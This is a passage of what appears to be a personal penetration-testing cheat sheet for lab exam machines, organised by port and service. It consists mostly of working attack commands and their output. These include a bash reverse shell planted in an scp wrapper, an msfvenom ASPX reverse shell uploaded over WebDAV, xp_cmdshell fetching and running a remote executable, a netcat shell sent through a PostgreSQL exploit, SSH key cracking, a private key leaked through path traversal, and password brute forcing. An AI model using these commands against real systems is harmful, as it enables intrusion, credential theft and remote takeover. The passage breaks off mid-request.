id_ecdsa:$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e697374703235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774b0d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0ddf7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00e0801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183

john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.hash

fireball         (id_ecdsa)
````
##### Finding Private keys
````
/etc/ssh/*pub #Use this to view the type of key you have aka (ecdsa)

ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@example01
````
````
/home/userE/.ssh/id_ecdsa.pub #public key
/home/userE/.ssh/id_ecdsa #private key
````
##### Errors
this means no password! Use it to login as a user on the box
````
ssh2john id_rsa > id_rsa.hash             
id_rsa has no password!
````
This means you are most likely using the private key for the wrong user, try doing a cat /etc/passwd in order to find other users to try it on. This error came from me trying a private key on the wrong user and private key which has no password asking for a password
````
ssh root@192.168.214.125 -p43022 -i id_rsa  
Warning: Identity file id_rsa not accessible: No such file or directory.
The authenticity of host '[192.168.214.125]:43022 ([192.168.214.125]:43022)' can't be established.
ED25519 key fingerprint is SHA256:rNaauuAfZyAq+Dhu+VTKM8BGGiU6QTQDleMX0uANTV4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.214.125]:43022' (ED25519) to the list of known hosts.
root@192.168.214.125's password: 
Permission denied, please try again.
root@192.168.214.125's password: 
Permission denied, please try again.
root@192.168.214.125's password: 
root@192.168.214.125: Permission denied (publickey,password).

````
##### Downloading files
````
scp -r -i id_rsa USERZ@192.168.214.149:/path/to/file/you/want .
````
##### RCE with scp
````
kali@kali:~/home/userA$ cat scp_wrapper.sh 
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
````
````
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    bash -i >& /dev/tcp/192.168.18.11/443 0>&1
    ;;
esac
````
````
scp -i .ssh/id_rsa scp_wrapper.sh userA@192.168.120.29:/home/userA/
````
````
kali@kali:~$ sudo nc -nlvp 443
````
````
kali@kali:~/home/userA$ ssh -i .ssh/id_rsa userA@192.168.120.29
PTY allocation request failed on channel 0
ACCESS DENIED.
````
````
connect to [192.168.118.11] from (UNKNOWN) [192.168.120.29] 48666
bash: cannot set terminal process group (932): Inappropriate ioctl for device
bash: no job control in this shell
userA@sorcerer:~$ id
id
uid=1003(userA) gid=1003(userA) groups=1003(userA)
userA@sorcerer:~$
````
#### Telnet port 23
##### Login
````
telnet -l jess 10.2.2.23
````
#### SMTP port 25
````
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25
````
````
nc -nv $IP 25
telnet $IP 25
EHLO ALL
VRFY <USER>
````
##### Exploits Found
SMTP PostFix Shellshock
````
https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
python2 shellshock.py 10.11.1.231 useradm@mail.local 192.168.119.168 139 root@mail.local #VRFY both useradm and root exist
````
#### DNS port 53
````
dnsrecon -d heist.example -n 192.168.54.165 -t axfr
````
#### HTTP(S) port 80,443
##### FingerPrinting
````
whatweb -a 3 $IP
nikto -ask=no -h http://$IP 2>&1
````
##### Directory Busting
##### Dirb
````
dirb http://target.com
````
##### ffuf
````
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$IP/FUZZ
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ
````
###### gobuster
````
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php,html,htm
````
###### feroxbuster
````
feroxbuster -u http://<$IP> -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 

feroxbuster -u http://192.168.138.249:8000/cms/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404 #if we dont want to see any denied

feroxbuster -u http://192.168.138.249:8000/cms/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404,302 #if website redirects
````
##### api
````
curl http://$ip/api/
````
````
[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}] 
````
````
curl http://$ip/api/user/ 
````
````
[{"login":"UserA","password":"test12","firstname":"UserA","lastname":"UserA","description":"Owner","id":10},{"login":"UserB","password":"test13","firstname":"UserB","lastname":"UserB","description":"Owner","id":30},{"login":"UserC","password":"test14","firstname":"UserC","lastname":"UserC","description":"Owner","id":6o},{"login":"UserD","password":"test15","firstname":"UserD","lastname":"UserD","description":"Owner","id":7o},{"login":"UserE","password":"test16","firstname":"UserE","lastname":"UserE","description":"Owner","id":100}]
````
##### Files of interest
````
Configuration files such as .ini, .config, and .conf files.
Application source code files such as .php, .aspx, .jsp, and .py files.
Log files such as .log, .txt, and .xml files.
Backup files such as .bak, .zip, and .tar.gz files.
Database files such as .mdb, .sqlite, .db, and .sql files.
````
##### java/apk files
````
jadx-gui
````
````
APK stands for Android Package Kit. It is the file format used by the Android operating system to distribute and install applications. An APK file contains all the necessary components and resources of an Android application, such as code, assets, libraries, and manifest files.
````
##### Brute Forcing / Fuzzing logins techniques
###### ffuf
````
ffuf -c -request request.txt -request-proto http -mode clusterbomb -fw 1 -w /usr/share/wordlists/rockyou.txt:FUZZ
````
````
POST /index.php HTTP/1.1

Host: 10.11.1.252:8000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 42

Origin: http://10.11.1.252:8000

Connection: close

Referer: http://10.11.1.252:8000/login.php

Cookie: PHPSESSID=89i7fj326pnqqarv9c03dpcuu2

Upgrade-Insecure-Requests: 1



username=admin&password=FUZZ&submit=Log+In
````
````
[Status: 302, Size: 63, Words: 10, Lines: 1, Duration: 165ms]
    * FUZZ: asdfghjkl;'

[Status: 302, Size: 63, Words: 10, Lines: 1, Duration: 172ms]
    * FUZZ: asdfghjkl;\\'
````
````
https://cybersecnerds.com/ffuf-everything-you-need-to-know/
````
##### WebDav
###### Hacktricks
````
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav
````
###### nmap results
````
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
````
###### Exploitation w/creds
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx
````
````
curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>
````
````
http://$VictimIP/shell.aspx

nc -nlvp 80  
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.153.122] 49997
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
service\defaultservice
````
##### CMS 
###### WP Scan
````
wpscan --url http://$IP/wp/
````
###### WP Brute Forcing
````
wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
````
###### simple-file-list
````
[+] simple-file-list
 | Location: http://192.168.192.105/wp-content/plugins/simple-file-list/
 | Last Updated: 2023-05-17T17:12:00.000Z
 | [!] The version is out of date, the latest version is 6.1.7
````
````
https://www.exploit-db.com/exploits/48979

Simple File List < 4.2.3 - Unauthenticated Arbitrary File Upload
````
###### Malicous Plugins
````
https://github.com/wetw0rk/malicious-wordpress-plugin
python3 wordpwn.py 192.168.119.140 443 Y

meterpreter > shell
Process 1098 created.
Channel 0 created.
python3 -c 'import pty;pty.spawn("/bin/bash")'
````
###### Drupal scan
````
droopescan scan drupal -u http://10.11.1.50:80
````
###### .git
````
sudo wget -r http://192.168.192.144/.git/ #dirb showed a .git folder
````
````
cd 192.168.192.144 #Move into the .git directory localy
````
````
sudo git show #Run a git show command in order to expose more information as below.                                                             
commit 213092183092183092138 (HEAD -> main)
Author: Stuart <luke@example.com>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

diff --git a/configuration/database.php b/configuration/database.php
index 55b1645..8ad08b0 100644
--- a/configuration/database.php
+++ b/configuration/database.php
@@ -2,8 +2,9 @@
 class Database{
     private $host = "localhost";
     private $db_name = "staff";
-    private $username = "stuart@example.lab";
-    private $password = "password123";
+    private $username = "";
+    private $password = "";
+// Cleartext creds cannot be added to public repos!
     public $conn;
     public function getConnection() {
         $this->conn = null;
````
##### API
````
http://192.168.214.150:8080/search
{"query":"*","result":""}
````
````
curl -X GET "http://192.168.214.150:8080/search?query=*"
{"query":"*","result":""}

curl -X GET "http://192.168.214.150:8080/search?query=lol"
{"query":"lol","result":""}
````
##### Exploitation CVEs
````
CVE-2014-6287 https://www.exploit-db.com/exploits/49584 #HFS (HTTP File Server) 2.3.x - Remote Command Execution
````
````
CVE-2015-6518 https://www.exploit-db.com/exploits/24044 phpliteadmin <= 1.9.3 Remote PHP Code Injection Vulnerability
````
````
CVE-XXXX-XXXX https://www.exploit-db.com/exploits/25971 Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
````
````
CVE-2009-4623 https://www.exploit-db.com/exploits/9623  Advanced comment system1.0  Remote File Inclusion Vulnerability
https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py
````
````
CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System 1.0 - SQL Injection
````
##### Exploitation http versions
````
80/tcp   open  http     Apache httpd 2.4.49
````
![image](https://user-images.githubusercontent.com/127046919/235009511-9135cd2a-06b7-4a15-9ad4-378fb0e797a1.png)

###### POC
````
./50383.sh targets.txt /etc/ssh/*pub
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@example01

./50383.sh targets.txt /home/userE/.ssh/id_ecdsa
192.168.138.245:8000
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
-----END OPENSSH PRIVATE KEY-----
````
##### ? notes
##### /etc/hosts FQDN
###### Background
````
on our initial scan we were able to find a pdf file that included credentials and instructions to setup an umbraco cms. "IIS is configured to only allow access to Umbraco the server is FQDN at the moment e.g. example02.example.com, not just example02"
````
###### Initial Scan
````
nmap -p 80,443,5985,14080,47001 -sC -sV -A 192.168.138.247                                                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 18:58 EDT
Nmap scan report for example02.example.com (192.168.138.247)
Host is up (0.067s latency).

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: example - New Hire Information
443/tcp   open  ssl/http Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: example - New Hire Information
5985/tcp  open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14080/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
47001/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unexampleble because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|10|2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2016 (89%), Microsoft Windows 10 (86%), Microsoft Windows 10 1607 (86%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   51.93 ms 192.168.119.1
2   51.88 ms example02.example.com (192.168.138.247)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.34 seconds
````
###### cat /etc/hosts
````
127.0.0.1       localhost
127.0.1.1       kali
192.168.138.247 example02.example.com
````
###### New Nmap Scan
````
nmap -p 80,443,5985,14080,47001 -sC -sV -A example02.example.com
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 19:00 EDT
Nmap scan report for example02.example.com (192.168.138.247)
Host is up (0.092s latency).

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: example - New Hire Information
443/tcp   open  ssl/http Apache httpd 2.4.54 (OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-title: example - New Hire Information
5985/tcp  open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14080/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-trane-info: Problem with XML parsing of /evox/about
47001/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|10|2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2016 (89%), Microsoft Windows 10 (85%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   100.83 ms 192.168.119.1
2   100.82 ms example02.example.com (192.168.138.247)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.21 seconds
`````
![image](https://user-images.githubusercontent.com/127046919/234426419-f8aa53ae-f5f7-4815-92d5-99dfde8ba5fb.png)


#### POP3 port 110
##### Enumerate
In this situation we used another service on port 4555 and reset the password of ryuu to test in order to login into pop3 and grab credentials for ssh. SSH later triggered an exploit which caught us a restricted shell as user ryuu
````
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 $IP
````
````
telnet $IP 110 #Connect to pop3
USER ryuu #Login as user
PASS test #Authorize as user
list #List every message
retr 1 #retrieve the first email
````
#### RPC port 111
##### Enumerate
````
nmap -sV -p 111 --script=rpcinfo $IP
````
#### MSRPC port 135,593
##### Enumeration
````
rpcdump.py 10.1.1.68 -p 135
````
#### SMB port 139,445
Port 139
NetBIOS stands for Network Basic Input Output System. It is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network. Software applications that run on a NetBIOS network locate and identify each other via their NetBIOS names. A NetBIOS name is up to 16 characters long and usually, separate from the computer name. Two applications start a NetBIOS session when one (the client) sends a command to “call” another client (the server) over TCP Port 139. (extracted from here)

Port 445
While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.
##### Enumeration
###### nmap
````
nmap --script smb-enum-shares.nse -p445 $IP
nmap –script smb-enum-users.nse -p445 $IP
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 $IP
nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 $IP
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $IP
````
###### OS Discovery
````
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery $IP
````
smbmap
````
smbmap -H $IP
smbmap -u "user" -p "pass" -H $IP
smbmap -H $IP -u null
smbmap -H $IP -P 139 2>&1
smbmap -H $IP -P 445 2>&1
smbmap -u null -p "" -H $IP -P 139 -x "ipconfig /all" 2>&1
smbmap -u null -p "" -H $IP -P 445 -x "ipconfig /all" 2>&1
````
rpcclient
````
rpcclient -U "" -N $IP
enumdomusers
enumdomgroups
queryuser 0x450
enumprinters
querydominfo
createdomuser
deletedomuser
lookupnames
lookupsids
lsaaddacctrights
lsaremoveacctrights
dsroledominfo
dsenumdomtrusts
````
enum4linux
````
enum4linux -a -M -l -d $IP 2>&1
enum4linux -a -u "" -p "" 192.168.180.71 && enum4linux -a -u "guest" -p "" $IP
````
crackmapexec
````
crackmapexec smb $IP
crackmapexec smb $IP -u "guest" -p ""
crackmapexec smb $IP --shares -u "guest" -p ""
crackmapexec smb $IP --shares -u "" -p ""
crackmapexec smb 10.1.1.68 -u 'guest' -p '' --users
````
smbclient
````
smbclient -U '%' -N \\\\<smb $IP>\\<share name>
smbclient -U 'guest' \\\\<smb $IP>\\<share name>
prompt off
recurse on
mget *
````
````
smbclient -U null -N \\\\<smb $IP>\\<share name>
````
````
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
smbclient -U '%' -N \\\\$IP\\<share name> -m SMB2
smbclient -U '%' -N \\\\$IP\\<share name> -m SMB3
````
##### smblient random port
````
smbclient -L \\192.168.214.125 -U "" -N -p 12445
Sharename       Type      Comment
        ---------       ----      -------
        Sarge       Disk      USERA Files
        IPC$            IPC       IPC Service (Samba 4.13.2)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.214.125 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
````
````
smbclient '//192.168.214.125/Sarge' -p 12445
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
````
#### IMAP port 143/993
##### Enumeration
````
nmap -p 143 --script imap-ntlm-info $IP
````
#### SNMP port 161 udp
````
sudo nmap --script snmp-* -sU -p161 $IP
sudo nmap -sU -p 161 --script snmp-brute $IP --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
````
````
snmpwalk -c public -v1 $IP
````
##### Hacktricks
````
https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
````
````
apt-get install snmp-mibs-downloader
sudo download-mibs
sudo vi /etc/snmp/snmp.conf
````
````
$ cat /etc/snmp/snmp.conf     
# As the snmp packages come without MIB files due to license reasons, loading
# of MIBs is disabled by default. If you added the MIBs you can reenable
# loading them by commenting out the following line.
#mibs :

# If you want to globally change where snmp libraries, commands and daemons
# look for MIBS, change the line below. Note you can set this for individual
# tools with the -M option or MIBDIRS environment variable.
#
# mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
````
````
sudo snmpbulkwalk -c public -v2c $IP .
sudo snmpbulkwalk -c public -v2c $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull 
````
#### LDAP port Port 389,636,3268,3269
````
ldapsearch -x -H ldap://192.168.214.122

# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 32 No such object
text: 0000208D: NameErr: DSID-0310021C, problem 2001 (NO_OBJECT), data 0, best 
 match of:
        ''


# numResponses: 1
````
````
ldapsearch -x -H ldap://192.168.214.122 -s base namingcontexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=exampleH,DC=example
namingcontexts: CN=Configuration,DC=exampleH,DC=example
namingcontexts: CN=Schema,CN=Configuration,DC=exampleH,DC=example
namingcontexts: DC=DomainDnsZones,DC=exampleH,DC=example
namingcontexts: DC=ForestDnsZones,DC=exampleH,DC=example

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
````
````
ldapsearch -x -H ldap://192.168.214.122 -b "DC=exampleH,DC=example"
````
#### MSSQL port 1433
##### Enumeration
````
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP
````
##### Crackmapexec
````
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'

````
##### Logging in
````
sqsh -S $IP -U sa -P CrimsonQuiltScalp193 #linux
proxychains sqsh -S 10.10.126.148 -U example.com\\sql_service -P password123 -D msdb #windows
````
##### Expliotation
````
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go
xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://10.10.126.147:7781/rshell.exe -OutFile c:\Users\Public\reverse.exe"'
go
xp_cmdshell 'c:\Users\Public\reverse.exe"'
go
````
#### NFS port 2049
##### Enumeration
````
showmount $IP
showmount -e $IP
````
##### Mounting
````
sudo mount -o [options] -t nfs ip_address:share directory_to_mount
mkdir temp 
mount -t nfs -o vers=3 10.11.1.72:/home temp -o nolock
````
##### new user with new permissions
````
sudo groupadd -g 1014 <group name>
sudo groupadd -g 1014 1014
sudo useradd -u 1014 -g 1014 <user>
sudo useradd -u 1014 -g 1014 test
sudo passwd <user>
sudo passwd test
````
##### Changing permissions
The user cannot be logged in or active
````
sudo usermod -aG 1014 root
````
##### Changing owners
````
-rw------- 1 root root 3381 Sep 24  2020 id_rsa
````
````
sudo chown kali id_rsa
````
````
-rw------- 1 kali root 3381 Sep 24  2020 id_rsa
````

#### cgms? port 3003
##### Enumeration
````
nc -nv $IP 3003 #run this
````
````
help #run this
````
````
bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;
````
````
version #run this
````
````
Aerospike Community Edition build 5.1.0.1
````
##### Exploitation
````
wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py
python3 cve2020-13151.py --ahost=192.168.208.143 --aport=3000 --pythonshell --lhost=192.168.45.208 --lport=443
nc -nlvp 443
````
#### MYSQL port 3306
##### Enumeration
````
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.11.1.8 
````
#### RDP port 3389
##### Enumeration
````
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 $IP -Pn
````
##### Password Spray
````
crowbar -b rdp -s 10.11.1.7/32 -U users.txt -C rockyou.txt
````
###### logging in
````
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
````
#### Postgresql port 5432,5433
##### RCE
````
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
````
##### Searchsploit RCE
````
PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)
multiple/remote/50847.py
````
````
python3 50847.py -i 192.168.214.47 -p 5437 -c "busybox nc 192.168.45.191 80 -e sh"
````
#### Unkown Port
##### Enumeration
````
nc -nv $IP 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
````
````
help #always run this after your nc -nv command
````
#### Passwords Guessed
````
root:root
admin@example.com:admin
admin:admin
USERK:USERK #name of the box
cassie:cassie #Found users with exiftool
````
## Web Pentest <img src="https://cdn-icons-png.flaticon.com/512/1304/1304061.png" width="40" height="40" />
### Nodes.js(express)
```
Send this request through burpsuite
```
![image](https://github.com/xsudoxx/OSCP/assets/127046919/1957806a-feed-4cbe-8f6f-d475ac99c48a)

````
POST /checkout HTTP/1.1

Host: 192.168.214.250:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://192.168.214.250:5000

Connection: close

Referer: http://192.168.214.250:5000/checkout
